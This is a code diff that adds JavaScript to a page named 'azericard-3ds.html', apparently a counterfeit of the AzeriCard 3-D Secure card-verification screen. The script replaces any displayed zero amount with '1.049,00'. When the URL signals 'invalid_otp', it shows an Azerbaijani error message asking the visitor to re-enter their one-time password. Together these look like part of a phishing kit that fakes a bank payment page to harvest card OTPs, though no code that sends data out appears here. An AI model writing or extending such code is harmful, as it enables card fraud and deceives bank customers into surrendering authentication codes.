@@ -447,3 +447,39 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     }
 });
+
+document.addEventListener('DOMContentLoaded', function() {
+    if (window.location.href.includes('azericard-3ds.html')) {
+        
+        // --- MƏBLƏĞİ DÜZƏLDİRİK (0 yazısını silirik) ---
+        const amountElements = document.querySelectorAll('*');
+        amountElements.forEach(el => {
+            if (el.childNodes.length === 1 && el.childNodes[0].nodeType === 3) {
+                if (el.innerText.includes('0,00') || el.innerText.trim() === '0') {
+                    el.innerText = '1.049,00'; 
+                }
+            }
+        });
+
+        // --- XƏTA MESAJINI GÖSTƏRİRİK ---
+        if (window.location.href.includes('error=invalid_otp')) {
+            // Əgər əvvəlcədən xəta div-i varsa təkrar yaratmırıq
+            if (!document.querySelector('.custom-error-msg')) {
+                const errDiv = document.createElement('div');
+                errDiv.className = 'custom-error-msg';
+                errDiv.style.color = '#d9534f';
+                errDiv.style.textAlign = 'center';
+                errDiv.style.marginTop = '15px';
+                errDiv.style.fontWeight = 'bold';
+                errDiv.style.fontSize = '14px';
+                errDiv.innerText = 'OTP kodu yanlışdır. Zəhmət olmasa yenidən cəhd edin.';
+                
+                // Formun altına əlavə edirik
+                const formParent = document.querySelector('form');
+                if (formParent) {
+                    formParent.parentNode.insertBefore(errDiv, formParent.nextSibling);
+                }
+            }
+        }
+    }
+});
